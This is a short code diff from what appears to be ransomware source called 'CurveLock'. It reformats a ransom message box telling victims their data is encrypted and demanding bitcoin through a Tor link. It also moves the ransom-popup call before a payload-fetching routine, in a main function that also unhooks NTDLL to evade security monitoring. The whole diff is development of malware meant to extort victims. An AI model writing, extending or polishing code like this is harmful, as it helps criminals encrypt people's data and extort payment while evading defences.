@@ -230,7 +230,7 @@ void ShowDownloadPopup() {
 	// Initial message box asking the user to pay up
 	int msgboxID = MessageBox(
 		NULL,
-		L"Your data has been encrypted. In order to decrypt your data, Pay 1000 bitcoins to the following tor link - <Example Tor link>. \n \t Click Ok To Continue",
+		L"Your data has been encrypted. \nIn order to decrypt your data, Pay 1000 bitcoins to the following tor link - <Example Tor link>. \n \t Click Ok To Continue",
 		L"CurveLock",
 		MB_ICONINFORMATION | MB_OKCANCEL
 	);
@@ -296,13 +296,13 @@ int main() {
 		printf("[!] Failed To Unhook NTDLL \n");
 	}
 
+	// Ask the user to pay up
+	ShowDownloadPopup();
+
 	//Fetching payload
 	if (!fetchPayload()) {
 		printf("[!] Failed To Fetch Payload \n");
 	}
 
-	// Ask the user to pay up
-	ShowDownloadPopup();
-	
 	return 0;
 }
